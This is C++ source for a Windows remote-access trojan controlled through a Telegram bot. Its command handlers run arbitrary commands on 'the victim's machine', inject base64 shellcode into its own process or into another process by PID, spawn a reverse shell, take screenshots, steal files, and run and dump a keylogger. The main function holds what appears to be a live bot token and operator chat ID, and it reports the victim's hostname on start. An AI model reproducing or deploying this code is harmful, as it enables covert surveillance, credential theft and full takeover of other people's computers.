#include "RootKit.h"
#include "telebot\Bot.hpp"
#include "KeyLogger.h"

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "zlib.lib")
#pragma comment(lib, "libcurl.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wldap32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "telebot.lib")
#pragma comment(lib, "wtsapi32.lib")


void Help(Bot* bot, Update update) {

	int chatID = update.message.chat.chatID;
	bot->sendChatAction(chatID, TYPING).fire();

	bot->sendMessage(chatID,
		"/help show this help message\n"
		"/exec <command> execute command on the victim's machine\n"
		"/shellcode <base64> inject a base64 shellcode into memory\n"
		"/inject_pid <pid> <base64> inject shellcode into a remote process\n"
		"/ps get processes list\n"
		"/screenshot take screenshot\n"
		"/shell <host> <port> spawn a reverse shell on the specified address\n"
		"/download <filename> download a file from victim's machine\n"
		"/downloadUrl download a file from a specific url\n"
		"/uploadUrl uploads a file to a specific url\n"
		"/keylog_start start the keylogger\n"
		"/keylog_stop stops the keylogger\n"
		"/dump_keylog dump keylogger's capture file\n"
	)
		.fire();
}

void Exec(Bot* bot, Update update) { 
	//work on this //
	//std::vector<std::string> v{ "Hello, ", "Cruel ", "World!" };
	//std::string result;
	//for (auto const& s : v) { result += s; }
	string message = update.message.text;
	int chatID = update.message.chat.chatID;
	string cmd = splitByString(message, "/exec")[1];
	string output = exec(cmd.c_str());
	bot->sendMessage(chatID, output).fire();
}

void Download(Bot* bot, Update update)
{
	//first_token = s.substr(0, s.find(' '));
	string filename = splitByChar(update.message.text, " ")[1];
	bot->sendDocument(update.message.chat.chatID, filename, readBytes(filename)).fire();
}

//void Upload(Bot* bot, Update update)
//{
//	update.update_json.get()
//}

void InjectCT(Bot* bot, Update update)
{
	const string b64ShellCode = splitByChar(update.message.text, " ")[1];
	string shellcode = base64_decode(b64ShellCode);
	injectCT(shellcode.c_str());
	bot->sendMessage(update.message.chat.chatID, "[+] executed shellcode with payload size of: " + to_string(sizeof(shellcode.c_str())));
}

void ReverseShell(Bot* bot, Update update)
{
	string message = update.message.text;
	int chatID = update.message.chat.chatID;
	vector<string> params = splitByChar(message, " ");
	bot->sendMessage(chatID, "a shell has spawned for you on " + params[1] + ":" + params[2]).fire();
	RevShell(params[1].c_str(), params[2].c_str());
}

void InjectPID(Bot* bot, Update update)
{
	const string b64ShellCode = splitByChar(update.message.text, " ")[2];
	int pid = atoi(splitByChar(update.message.text, " ")[1].c_str());
	string shellcode = base64_decode(b64ShellCode);
	pid_inject(pid,shellcode.c_str());
	bot->sendMessage(update.message.chat.chatID, "[+] injected pid number" + to_string(pid) + "with shellcode with payload size of: " + to_string(sizeof(shellcode.c_str())));
}

void ScreenShot(Bot* bot, Update update)
{
	string message = update.message.text;
	int chatID = update.message.chat.chatID;
	char name[256];
	random_str(name, 7);
	strcat(name, ".tmp");
	screenshot(name);
	bot->sendPhoto(chatID,name, readBytes(name)).fire();
	DeleteFileA(name);
}

void PS(Bot* bot, Update update)
{
	bot->sendMessage(update.message.chat.chatID, getProcesses()).fire();
}

void StartKeyLog(Bot* bot, Update update)
{
	if (!KL::isLogging)
	{
		if (KL::StartK())
			bot->sendMessage(update.message.chat.chatID, "[+] KeyLogger has started").fire();
		else {
			bot->sendMessage(update.message.chat.chatID, "[+] KeyLogger is unable to start").fire();
		}
	}
	else
		bot->sendMessage(update.message.chat.chatID, "[!] KeyLogger has already started!").fire();
}


void StopKeyLog(Bot* bot, Update update)
{
	if (KL::isLogging)
	{
		KL::StopK();
		bot->sendMessage(update.message.chat.chatID, "[+] KeyLogger has stopped").fire();
	}
	else
		bot->sendMessage(update.message.chat.chatID, "[!] KeyLogger is not running").fire();
}

void DumpKeyLog(Bot* bot, Update update)
{	
	bot->sendMessage(update.message.chat.chatID, readBytes(KL::szDir)).fire();
}

void InjectExplorer(Bot* bot, Update update)
{
	inject_explorer();
	bot->sendMessage(update.message.chat.chatID, "Done");
}

//int WinMain(HINSTANCE hInstace, HINSTANCE hPrevInstance, LPSTR cmdLine, int pShowCmd)
int main()
{
	char n[20];
	hostname(n);
	Bot bot = Bot("1675171994:AAFL6z9ibR3eZBFpck4AO2UNRAKccuNcgwg");
	
	// Add a function in response to /helloWorld
	try
	{
		bot.sendMessage(457503811,n).fire();
		bot.addCommandHandler("help", &Help);
		bot.addCommandHandler("exec", &Exec); 
		bot.addCommandHandler("screenshot", &ScreenShot);
		bot.addCommandHandler("download", &Download);
		bot.addCommandHandler("keylog_start", &StartKeyLog); 
		bot.addCommandHandler("keylog_stop", &StopKeyLog); 
		bot.addCommandHandler("dump_keylog", &DumpKeyLog); 
		bot.addCommandHandler("shellcode", &InjectCT);
		bot.addCommandHandler("inject_pid", &InjectPID);
		bot.addCommandHandler("ps", &PS);
		bot.addCommandHandler("shell", &ReverseShell);
		//bot.setUpdateHandler(&Upload);
		// Start getting updates!
		bot.startPolling();

		bot.idle();
	}
	catch (exception e) { bot.sendMessage(457503811, e.what()).fire();}
	return 0;
}
